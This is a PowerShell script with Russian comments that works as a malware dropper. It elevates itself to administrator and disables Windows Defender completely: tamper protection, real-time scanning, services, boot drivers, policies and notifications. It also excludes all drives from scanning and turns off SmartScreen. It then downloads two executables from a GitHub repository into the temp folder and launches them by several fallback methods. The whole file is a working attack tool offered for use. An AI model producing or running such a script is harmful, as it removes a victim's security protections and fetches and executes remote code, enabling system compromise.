Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

# ========== ОТЛАДКА ==========
$DebugMode = $true  # Включить отладку
$logFile = "$env:TEMP\defender_killer_debug.log"

function Write-DebugLog {
    param($Message, $Color = "White")
    $timestamp = Get-Date -Format "HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    Write-Host $logMessage -ForegroundColor $Color
    Add-Content -Path $logFile -Value $logMessage
}

Write-DebugLog "=== ЗАПУСК СКРИПТА ===" -Color "Cyan"
Write-DebugLog "Log file: $logFile" -Color "Gray"

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    Write-DebugLog "Нет прав администратора, запрос повышения..." -Color "Yellow"
    if ($shouldAssumeToBeElevated) {
        Write-DebugLog "Повышение прав не сработало" -Color "Red"
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -executionpolicy bypass -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Write-DebugLog "Права администратора: ДА" -Color "Green"
Set-Location "$workingDirOverride"

# ========== ПОЛНОЕ ОТКЛЮЧЕНИЕ DEFENDER ==========
Write-DebugLog "" -Color "White"
Write-DebugLog "========== ПОЛНОЕ ОТКЛЮЧЕНИЕ WINDOWS DEFENDER ==========" -Color "Yellow"

# 1. Сначала отключаем Tamper Protection (ключевой момент!)
Write-DebugLog "[1/10] Отключение Tamper Protection..." -Color "Cyan"
try {
    # Способ 1: через реестр
    reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f 2>&1 | Out-Null
    # Способ 2: через PowerShell (если доступно)
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-DebugLog "  Tamper Protection отключен" -Color "Green"
} catch {
    Write-DebugLog "  Не удалось отключить Tamper Protection" -Color "Yellow"
}

# 2. Отключаем реальную защиту
Write-DebugLog "[2/10] Отключение Real-Time Protection..." -Color "Cyan"
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-DebugLog "  Real-Time Protection отключен" -Color "Green"
} catch {
    Write-DebugLog "  Ошибка отключения Real-Time Protection" -Color "Yellow"
}

# 3. Останавливаем все службы Defender
Write-DebugLog "[3/10] Остановка служб Windows Defender..." -Color "Cyan"
$services = @("WinDefend", "WdNisSvc", "MDCoreSvc", "SecurityHealthService", "Sense")
foreach ($svc in $services) {
    try {
        Stop-Service $svc -Force -ErrorAction SilentlyContinue
        Write-DebugLog "  Остановлена: $svc" -Color "Gray"
    } catch {
        Write-DebugLog "  Не найдена: $svc" -Color "DarkGray"
    }
}

# 4. Отключаем автозагрузку служб
Write-DebugLog "[4/10] Отключение автозагрузки служб..." -Color "Cyan"
$servicesToDisable = @(
    @{Name="WinDefend"; Start=4},
    @{Name="WdNisSvc"; Start=4},
    @{Name="WdNisDrv"; Start=4},
    @{Name="WdFilter"; Start=4},
    @{Name="WdBoot"; Start=4},
    @{Name="MDCoreSvc"; Start=4},
    @{Name="SecurityHealthService"; Start=4}
)
foreach ($svc in $servicesToDisable) {
    try {
        reg add "HKLM\System\CurrentControlSet\Services\$($svc.Name)" /v "Start" /t REG_DWORD /d $svc.Start /f 2>&1 | Out-Null
        sc.exe config $($svc.Name) start= disabled 2>&1 | Out-Null
        Write-DebugLog "  Отключена: $($svc.Name)" -Color "Gray"
    } catch {
        Write-DebugLog "  Ошибка: $($svc.Name)" -Color "DarkGray"
    }
}

# 5. Удаляем политики
Write-DebugLog "[5/10] Настройка политик Defender..." -Color "Cyan"
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>&1 | Out-Null
Start-Sleep -Milliseconds 500

# Создаем ключи
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /f 2>&1 | Out-Null

# Устанавливаем ключевые параметры
$defenderRegKeys = @(
    "HKLM\Software\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender /v DisableAntiVirus /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableIOAVProtection /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableOnAccessProtection /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet /v SpyNetReporting /t REG_DWORD /d 0 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet /v SubmitSamplesConsent /t REG_DWORD /d 2 /f"
)

foreach ($key in $defenderRegKeys) {
    try {
        reg add $key 2>&1 | Out-Null
        Write-DebugLog "  Установлено: $key" -Color "Gray"
    } catch {
        Write-DebugLog "  Ошибка: $key" -Color "DarkGray"
    }
}

# 6. Добавляем исключения для всех дисков
Write-DebugLog "[6/10] Добавление исключений для всех дисков..." -Color "Cyan"
$drives = Get-PSDrive -PSProvider FileSystem
foreach ($drive in $drives) {
    try {
        Add-MpPreference -ExclusionPath "$($drive.Root)" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "$($drive.Root)*" -ErrorAction SilentlyContinue
        Write-DebugLog "  Исключение: $($drive.Root)" -Color "Gray"
    } catch {}
}

# 7. Отключаем задачи планировщика
Write-DebugLog "[7/10] Отключение задач планировщика..." -Color "Cyan"
$tasks = @(
    "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
    "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
    "Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
    "Microsoft\Windows\Windows Defender\Windows Defender Verification"
)
foreach ($task in $tasks) {
    try {
        schtasks /Change /TN "$task" /Disable 2>&1 | Out-Null
        Write-DebugLog "  Отключена: $task" -Color "Gray"
    } catch {}
}

# 8. Отключаем уведомления
Write-DebugLog "[8/10] Отключение уведомлений..." -Color "Cyan"
reg add "HKLM\Software\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d 0 /f 2>&1 | Out-Null

# 9. Убиваем процессы
Write-DebugLog "[9/10] Завершение процессов Defender..." -Color "Cyan"
$processes = @("MsMpEng", "NisSrv", "SecurityHealthService", "MsSense", "MpCmdRun")
foreach ($proc in $processes) {
    try {
        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
        Write-DebugLog "  Завершен: $proc" -Color "Gray"
    } catch {}
}

# 10. Применяем настройки через WMI
Write-DebugLog "[10/10] Применение настроек через WMI..." -Color "Cyan"
try {
    $wmi = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpPreference" -ErrorAction SilentlyContinue
    if ($wmi) {
        $wmi.DisableRealtimeMonitoring = $true
        $wmi.Put() | Out-Null
        Write-DebugLog "  Настройки WMI применены" -Color "Green"
    }
} catch {}

Write-DebugLog "" -Color "White"
Write-DebugLog "=== СТАТУС DEFENDER ===" -Color "Yellow"

# Проверка статуса
try {
    $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($defenderStatus) {
        Write-DebugLog "RealTimeProtectionEnabled: $($defenderStatus.RealTimeProtectionEnabled)" -Color $(if($defenderStatus.RealTimeProtectionEnabled){"Red"}else{"Green"})
        Write-DebugLog "AntivirusEnabled: $($defenderStatus.AntivirusEnabled)" -Color $(if($defenderStatus.AntivirusEnabled){"Red"}else{"Green"})
        Write-DebugLog "BehaviorMonitorEnabled: $($defenderStatus.BehaviorMonitorEnabled)" -Color $(if($defenderStatus.BehaviorMonitorEnabled){"Red"}else{"Green"})
    }
} catch {}

# Проверка служб
$svcStatus = Get-Service WinDefend -ErrorAction SilentlyContinue
if ($svcStatus) {
    Write-DebugLog "Служба WinDefend: $($svcStatus.Status)" -Color $(if($svcStatus.Status -eq "Running"){"Red"}else{"Green"})
}

Write-DebugLog "" -Color "White"
Write-DebugLog "=== СКАЧИВАНИЕ ФАЙЛОВ ===" -Color "Yellow"

# ========== СКАЧИВАНИЕ ФАЙЛОВ ==========
$temp = $env:TEMP
$downloaded = 0

function Download-File {
    param($url, $dest)
    
    Write-DebugLog "Скачивание: $(Split-Path $dest -Leaf)" -Color "Cyan"
    
    if (Test-Path $dest) { 
        try {
            Remove-Item $dest -Force -ErrorAction SilentlyContinue
            Write-DebugLog "  Удален старый файл" -Color "Gray"
        } catch {}
    }
    
    # Пробуем разные методы
    $methods = @(
        { (New-Object System.Net.WebClient).DownloadFile($url, $dest) },
        { Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -TimeoutSec 30 },
        { curl.exe -L -o $dest $url }
    )
    
    foreach ($method in $methods) {
        try {
            & $method
            if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) {
                $size = [math]::Round((Get-Item $dest).Length / 1KB, 2)
                Write-DebugLog "  УСПЕХ: $size KB" -Color "Green"
                return $true
            }
        } catch {
            Write-DebugLog "  Метод не сработал: $($_.Exception.Message)" -Color "DarkGray"
        }
    }
    
    Write-DebugLog "  НЕ УДАЛОСЬ СКАЧАТЬ" -Color "Red"
    return $false
}

# Скачиваем файлы
$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-DebugLog "`n[1/2] proga1.exe" -Color "Yellow"
if (Download-File $url1 $dest1) {
    $downloaded++
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-DebugLog "`n[2/2] proga2.exe" -Color "Yellow"
if (Download-File $url2 $dest2) {
    $downloaded++
} else {
    Write-DebugLog "  Создаем копию из proga1.exe" -Color "Yellow"
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        $downloaded++
    }
}

# ========== ЗАПУСК ФАЙЛОВ ==========
Write-DebugLog "`n=== ЗАПУСК ФАЙЛОВ ===" -Color "Yellow"

# Отключаем SmartScreen для текущей сессии
Write-DebugLog "Отключение SmartScreen..." -Color "Cyan"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue

# Пытаемся запустить через разные методы
function Run-File {
    param($path, $name)
    
    if (-not (Test-Path $path)) {
        Write-DebugLog "$name: файл не найден" -Color "Red"
        return $false
    }
    
    Write-DebugLog "Запуск $name..." -Color "Cyan"
    
    # Метод 1: Обычный запуск
    try {
        Start-Process -FilePath $path -WindowStyle Normal -ErrorAction Stop
        Write-DebugLog "  Запущен через Start-Process" -Color "Green"
        return $true
    } catch {
        Write-DebugLog "  Start-Process: $($_.Exception.Message)" -Color "DarkGray"
    }
    
    # Метод 2: Через cmd
    try {
        cmd /c start "" "$path" 2>&1 | Out-Null
        Write-DebugLog "  Запущен через cmd" -Color "Green"
        return $true
    } catch {
        Write-DebugLog "  cmd метод не сработал" -Color "DarkGray"
    }
    
    # Метод 3: Через WMI
    try {
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $path -ErrorAction Stop | Out-Null
        Write-DebugLog "  Запущен через WMI" -Color "Green"
        return $true
    } catch {
        Write-DebugLog "  WMI метод не сработал" -Color "DarkGray"
    }
    
    Write-DebugLog "  НЕ УДАЛОСЬ ЗАПУСТИТЬ $name" -Color "Red"
    return $false
}

Run-File $dest1 "proga1.exe"
Start-Sleep -Seconds 1
Run-File $dest2 "proga2.exe"

# ========== ФИНАЛ ==========
Write-DebugLog "`n=== ГОТОВО ($downloaded/2 файлов) ===" -Color "Green"
Write-DebugLog "Лог сохранен: $logFile" -Color "Gray"
Write-DebugLog "`nРЕКОМЕНДУЕТСЯ ПЕРЕЗАГРУЗИТЬ КОМПЬЮТЕР!" -Color "Yellow"
Write-DebugLog "Нажмите любую клавишу для выхода..." -Color "Gray"

$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
